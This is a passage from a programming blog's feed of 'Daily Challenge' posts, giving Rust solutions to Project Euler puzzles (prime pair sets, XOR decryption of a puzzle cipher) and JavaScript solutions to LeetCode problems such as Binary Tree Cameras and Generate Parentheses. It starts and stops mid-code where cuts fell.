<span class="number">100</span> * <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">10</span>..<span class="number">100</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = tmp + i;</span><br><span class="line">        <span class="keyword">if</span> map.contains_key(&amp;tmp) &#123;</span><br><span class="line">            <span class="keyword">let</span> mask = map.get(&amp;tmp).unwrap();</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span>..<span class="number">6</span> &#123;</span><br><span class="line">                <span class="keyword">let</span> tp = <span class="number">1</span> &lt;&lt; i;</span><br><span class="line">                <span class="keyword">if</span> bitmask &amp; tp == <span class="number">0</span> &amp;&amp; mask &amp; tp != <span class="number">0</span> &#123;</span><br><span class="line">                    ans[size] = tmp;</span><br><span class="line">                    <span class="keyword">if</span> dfs(tmp, bitmask | tp, size + <span class="number">1</span>, &amp;map, &amp;<span class="keyword">mut</span> ans) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="968-Binary-Tree-Cameras"><a href="#968-Binary-Tree-Cameras" class="headerlink" title="968. Binary Tree Cameras"></a>968. Binary Tree Cameras</h3><p>Given a binary tree, we install cameras on the nodes of the tree. </p><p>Each camera at a node can monitor <strong>its parent, itself, and its immediate children</strong>.</p><p>Calculate the minimum number of cameras needed to monitor all nodes of the tree.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [0,0,null,0,0]</span><br><span class="line">Output: 1</span><br><span class="line">Explanation: One camera is enough to monitor all nodes if placed as shown.</span><br></pre></td></tr></table></figure><p><img src="https://assets.leetcode.com/uploads/2018/12/29/bst_cameras_01.png" alt="img"></p><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [0,0,null,0,null,0,null,null,0]</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: At least two cameras are needed to monitor all nodes of the tree. The above image shows one of the valid configurations of camera placement.</span><br></pre></td></tr></table></figure><p><img src="https://assets.leetcode.com/uploads/2018/12/29/bst_cameras_02.png" alt="img"></p><p><strong>Note:</strong></p><ol><li>The number of nodes in the given tree will be in the range <code>[1, 1000]</code>.</li><li><strong>Every</strong> node has value 0.</li></ol><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Greedy algorithm is capable for this.</p><p>We begin with bottom, where all children are <em>null</em>, we first mark <em>null</em> been monitored, if and only if the node&#39;s child is not monitored, or this node is root and is not monitored, we need to put a camera on it.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * function TreeNode(val) &#123;</span></span><br><span class="line"><span class="comment"> *     this.val = val;</span></span><br><span class="line"><span class="comment"> *     this.left = this.right = null;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;TreeNode&#125; root</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> minCameraCover = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> ans = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">  set.add(<span class="literal">null</span>);</span><br><span class="line">  <span class="keyword">const</span> dfs = <span class="function">(<span class="params">node, parent</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (node !== <span class="literal">null</span>) &#123;</span><br><span class="line">      dfs(node.left, node);</span><br><span class="line">      dfs(node.right, node);</span><br><span class="line">      <span class="keyword">if</span> ((parent === <span class="literal">null</span> &amp;&amp; !set.has(node)) ||</span><br><span class="line">           !set.has(node.left) || !set.has(node.right)) &#123;</span><br><span class="line">        ans += <span class="number">1</span>;</span><br><span class="line">        set.add(node);</span><br><span class="line">        set.add(parent);</span><br><span class="line">        set.add(node.left);</span><br><span class="line">        set.add(node.right);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  dfs(root, <span class="literal">null</span>);</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-02-18 Daily Challenge</title>
      <link href="/2019-02-18-Daily-Challenge/"/>
      <url>/2019-02-18-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Prime pair sets</em> in <em>Rust</em> and <em>Generate Parentheses</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Prime-pair-sets"><a href="#Prime-pair-sets" class="headerlink" title="Prime pair sets"></a>Prime pair sets</h3><h3 id="Problem-60"><a href="#Problem-60" class="headerlink" title="Problem 60"></a>Problem 60</h3><p>The primes 3, 7, 109, and 673, are quite remarkable. By taking any two primes and concatenating them in any order the result will always be prime. For example, taking 7 and 109, both 7109 and 1097 are prime. The sum of these four primes, 792, represents the lowest sum for a set of four primes with this property.</p><p>Find the lowest sum for a set of five primes for which any two primes concatenate to produce another prime.</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Brute force.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> primal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> primal::Sieve;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> sieve: Sieve = Sieve::new(<span class="number">1_000_000_000</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> found = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> cur = sieve.prime_pi(<span class="number">673</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> buf: [<span class="built_in">usize</span>; <span class="number">5</span>] = [<span class="number">0</span>; <span class="number">5</span>];</span><br><span class="line">    <span class="keyword">while</span> !found &#123;</span><br><span class="line">        buf[<span class="number">0</span>] = sieve.nth_prime(cur);</span><br><span class="line">        <span class="keyword">match</span> dfs(<span class="number">1</span>, cur, &amp;<span class="keyword">mut</span> buf, &amp;sieve) &#123;</span><br><span class="line">            <span class="literal">true</span> =&gt; found = <span class="literal">true</span>,</span><br><span class="line">            <span class="literal">false</span> =&gt; cur += <span class="number">1</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"&#123;:?&#125;"</span>, buf);</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> &amp;buf &#123;</span><br><span class="line">        ans += i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">dfs</span></span>(n: <span class="built_in">usize</span>, index: <span class="built_in">usize</span>, <span class="keyword">mut</span> buf: &amp;<span class="keyword">mut</span> [<span class="built_in">usize</span>], sieve: &amp;Sieve) -&gt; <span class="built_in">bool</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">5</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// if n == 4 &#123;</span></span><br><span class="line">    <span class="comment">//     println!("&#123;:?&#125;", buf);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> (<span class="number">2</span>..index).rev() &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = sieve.nth_prime(i);</span><br><span class="line">        <span class="keyword">if</span> test_it(n, tmp, &amp;buf, &amp;sieve) &#123;</span><br><span class="line">            buf[n] = tmp;</span><br><span class="line">            <span class="keyword">if</span> dfs(n+<span class="number">1</span>, i, &amp;<span class="keyword">mut</span> buf, &amp;sieve) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">test_it</span></span>(index: <span class="built_in">usize</span>, num: <span class="built_in">usize</span>, buf: &amp;[<span class="built_in">usize</span>], sieve: &amp;Sieve) -&gt; <span class="built_in">bool</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span>..index &#123;</span><br><span class="line">        <span class="keyword">if</span> !(sieve.is_prime(append_num(num, buf[i]))&amp;&amp;sieve.is_prime(append_num(buf[i], num))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">append_num</span></span>(<span class="keyword">mut</span> left: <span class="built_in">usize</span>, <span class="keyword">mut</span> right: <span class="built_in">usize</span>) -&gt; <span class="built_in">usize</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> right != <span class="number">0</span> &#123;</span><br><span class="line">        tmp = tmp * <span class="number">10</span> + right % <span class="number">10</span>;</span><br><span class="line">        right /= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> tmp != <span class="number">0</span> &#123;</span><br><span class="line">        left = left * <span class="number">10</span> + tmp % <span class="number">10</span>;</span><br><span class="line">        tmp /= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    left</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="22-Generate-Parentheses"><a href="#22-Generate-Parentheses" class="headerlink" title="22. Generate Parentheses"></a>22. Generate Parentheses</h3><p>Given <em>n</em> pairs of parentheses, write a function to generate all combinations of well-formed parentheses.</p><p>For example, given <em>n</em> = 3, a solution set is:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &quot;((()))&quot;,</span><br><span class="line">  &quot;(()())&quot;,</span><br><span class="line">  &quot;(())()&quot;,</span><br><span class="line">  &quot;()(())&quot;,</span><br><span class="line">  &quot;()()()&quot;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Solve it recursively.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> generateParenthesis = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n === <span class="number">0</span>) <span class="keyword">return</span> [<span class="string">""</span>];</span><br><span class="line">  <span class="keyword">let</span> ans = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; i += <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> left <span class="keyword">of</span> generateParenthesis(i)) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> right <span class="keyword">of</span> generateParenthesis(n<span class="number">-1</span>-i))&#123;</span><br><span class="line">        ans.push(<span class="string">`(<span class="subst">$&#123;left&#125;</span>)<span class="subst">$&#123;right&#125;</span>`</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-02-17 Daily Challenge</title>
      <link href="/2019-02-17-Daily-Challenge/"/>
      <url>/2019-02-17-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>XOR decryption</em> in <em>Rust</em> and <em>Sort List</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="XOR-decryption"><a href="#XOR-decryption" class="headerlink" title="XOR decryption"></a>XOR decryption</h3><h3 id="Problem-59"><a href="#Problem-59" class="headerlink" title="Problem 59"></a>Problem 59</h3><blockquote><p>Please note that the file associated with this problem, p059_cipher.txt, was changed on Tuesday 5 February 2019. If you downloaded the file before this date, please download the new version. This notice will remain for seven days.</p></blockquote><p>Each character on a computer is assigned a unique code and the preferred standard is ASCII (American Standard Code for Information Interchange). For example, uppercase A = 65, asterisk (*) = 42, and lowercase k = 107.</p><p>A modern encryption method is to take a text file, convert the bytes to ASCII, then XOR each byte with a given value, taken from a secret key. The advantage with the XOR function is that using the same encryption key on the cipher text, restores the plain text; for example, 65 XOR 42 = 107, then 107 XOR 42 = 65.</p><p>For unbreakable encryption, the key is the same length as the plain text message, and the key is made up of random bytes. The user would keep the encrypted message and the encryption key in different locations, and without both &quot;halves&quot;, it is impossible to decrypt the message.</p><p>Unfortunately, this method is impractical for most users, so the modified method is to use a password as a key. If the password is shorter than the message, which is likely, the key is repeated cyclically throughout the message. The balance for this method is using a sufficiently long password key for security, but short enough to be memorable.</p><p>Your task has been made easy, as the encryption key consists of three lower case characters. Using <a href="https://projecteuler.net/project/resources/p059_cipher.txt" target="_blank" rel="noopener">p059_cipher.txt</a> (right click and &#39;Save Link/Target As...&#39;), a file containing the encrypted ASCII codes, and the knowledge that the plain text must contain common English words, decrypt the message and find the sum of the ASCII values in the original text.</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>MTP hahaha.</p><p>Simply assume that space is most character~</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> cipher: [<span class="built_in">u8</span>; <span class="number">1455</span>] = [<span class="number">36</span>,<span class="number">22</span>,<span class="number">80</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">23</span>,<span class="number">25</span>,<span class="number">19</span>,<span class="number">17</span>,<span class="number">88</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">19</span>,<span class="number">21</span>,<span class="number">11</span>,<span class="number">88</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">69</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">0</span>,<span class="number">88</span>,<span class="number">25</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">2</span>,<span class="number">10</span>,<span class="number">28</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">25</span>,<span class="number">10</span>,<span class="number">22</span>,<span class="number">80</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">80</span>,<span class="number">10</span>,<span class="number">22</span>,<span class="number">21</span>,<span class="number">69</span>,<span class="number">23</span>,<span class="number">22</span>,<span class="number">69</span>,<span class="number">61</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">29</span>,<span class="number">2</span>,<span class="number">66</span>,<span class="number">11</span>,<span class="number">80</span>,<span class="number">8</span>,<span class="number">23</span>,<span class="number">3</span>,<span class="number">17</span>,<span class="number">88</span>,<span class="number">19</span>,<span class="number">0</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">17</span>,<span class="number">17</span>,<span class="number">29</span>,<span class="number">20</span>,<span class="number">69</span>,<span class="number">8</span>,<span class="number">17</span>,<span class="number">21</span>,<span class="number">29</span>,<span class="number">2</span>,<span class="number">22</span>,<span class="number">84</span>,<span class="number">80</span>,<span class="number">71</span>,<span class="number">60</span>,<span class="number">21</span>,<span class="number">69</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">21</span>,<span class="number">25</span>,<span class="number">22</span>,<span class="number">88</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">25</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">88</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">27</span>,<span class="number">25</span>,<span class="number">21</span>,<span class="number">10</span>,<span class="number">31</span>,<span class="number">6</span>,<span class="number">25</span>,<span class="number">2</span>,<span class="number">16</span>,<span class="number">21</span>,<span class="number">82</span>,<span class="number">69</span>,<span class="number">35</span>,<span class="number">63</span>,<span class="number">11</span>,<span class="number">88</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">29</span>,<span class="number">80</span>,<span class="number">22</span>,<span class="number">13</span>,<span class="number">29</span>,<span class="number">22</span>,<span class="number">88</span>,<span class="number">31</span>,<span class="number">3</span>,<span class="number">88</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">25</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">80</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">80</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">19</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">10</span>,<span class="number">27</span>,<span class="number">17</span>,<span class="number">9</span>,<span class="number">11</span>,<span class="number">45</span>,<span class="number">95</span>,<span class="number">88</span>,<span class="number">57</span>,<span class="number">69</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">29</span>,<span class="number">80</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">19</span>,<span class="number">0</span>,<span class="number">22</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">80</span>,<span class="number">3</span>,<span class="number">23</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">28</span>,<span class="number">92</span>,<span class="number">69</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">12</span>,<span class="number">21</span>,<span class="number">69</span>,<span class="number">13</span>,<span class="number">30</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">27</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">84</span>,<span class="number">80</span>,<span class="number">4</span>,<span class="number">22</span>,<span class="number">80</span>,<span class="number">0</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">2</span>,<span class="number">25</span>,<span class="number">30</span>,<span class="number">17</span>,<span class="number">88</span>,<span class="number">21</span>,<span class="number">29</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">12</span>,<span class="number">23</span>,<span class="number">30</span>,<span class="number">69</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">23</span>,<span class="number">88</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">29</span>,<span class="number">80</span>,<span class="number">0</span>,<span class="number">22</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">21</span>,<span class="number">69</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">88</span>,<span class="number">31</span>,<span class="number">3</span>,<span class="number">88</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">3</span>,<span class="number">69</span>,<span class="number">11</span>,<span class="number">21</span>,<span class="number">23</span>,<span class="number">17</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">88</span>,<span class="number">65</span>,<span class="number">69</span>,<span class="number">83</span>,<span class="number">80</span>,<span class="number">84</span>,<span class="number">87</span>,<span class="number">68</span>,<span class="number">69</span>,<span class="number">83</span>,<span class="number">80</span>,<span class="number">84</span>,<span class="number">87</span>,<span class="number">73</span>,<span class="number">69</span>,<span class="number">83</span>,<span class="number">80</span>,<span class="number">84</span>,<span class="number">87</span>,<span class="number">65</span>,<span class="number">83</span>,<span class="number">88</span>,<span class="number">91</span>,<span class="number">69</span>,<span class="number">29</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">86</span>,<span class="number">92</span>,<span class="number">69</span>,<span class="number">15</span>,<span class="number">24</span>,<span class="number">12</span>,<span class="number">27</span>,<span class="number">24</span>,<span class="number">69</span>,<span class="number">28</span>,<span class="number">21</span>,<span class="number">21</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">80</span>,<span class="number">10</span>,<span class="number">22</span>,<span class="number">80</span>,<span class="number">17</span>,<span class="number">16</span>,<span class="number">21</span>,<span class="number">69</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">28</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">80</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">80</span>,<span class="number">17</span>,<span class="number">16</span>,<span class="number">21</span>,<span class="number">69</span>,<span class="number">27</span>,<span class="number">25</span>,<span class="number">23</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">0</span>,<span class="number">84</span>,<span class="number">80</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">80</span>,<span class="number">17</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">17</span>,<span class="number">88</span>,<span class="number">25</span>,<span class="number">3</span>,<span class="number">88</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">29</span>,<span class="number">80</span>,<span class="number">17</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">88</span>,<span class="number">3</span>,<span class="number">16</span>,<span class="number">21</span>,<span class="number">80</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">80</span>,<span class="number">17</span>,<span class="number">16</span>,<span class="number">25</span>,<span class="number">22</span>,<span class="number">88</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">25</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">80</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">80</span>,<span class="number">10</span>,<span class="number">26</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">17</span>,<span class="number">30</span>,<span class="number">0</span>,<span class="number">28</span>,<span class="number">92</span>,<span class="number">69</span>,<span class="number">30</span>,<span class="number">2</span>,<span class="number">10</span>,<span class="number">21</span>,<span class="number">80</span>,<span class="number">12</span>,<span class="number">12</span>,<span class="number">80</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">80</span>,<span class="number">10</span>,<span class="number">22</span>,<span class="number">19</span>,<span class="number">0</span>,<span class="number">88</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">29</span>,<span class="number">80</span>,<span class="number">20</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">17</span>,<span class="number">17</span>,<span class="number">13</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">88</span>,<span class="number">31</span>,<span class="number">3</span>,<span class="number">88</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">29</span>,<span class="number">80</span>,<span class="number">6</span>,<span class="number">17</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">69</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">9</span>,<span class="number">20</span>,<span class="number">31</span>,<span class="number">18</span>,<span class="number">11</span>,<span class="number">94</span>,<span class="number">69</span>,<span class="number">54</span>,<span class="number">17</span>,<span class="number">8</span>,<span class="number">29</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">84</span>,<span class="number">80</span>,<span class="number">44</span>,<span class="number">88</span>,<span class="number">24</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">21</span>,<span class="number">69</span>,<span class="number">30</span>,<span 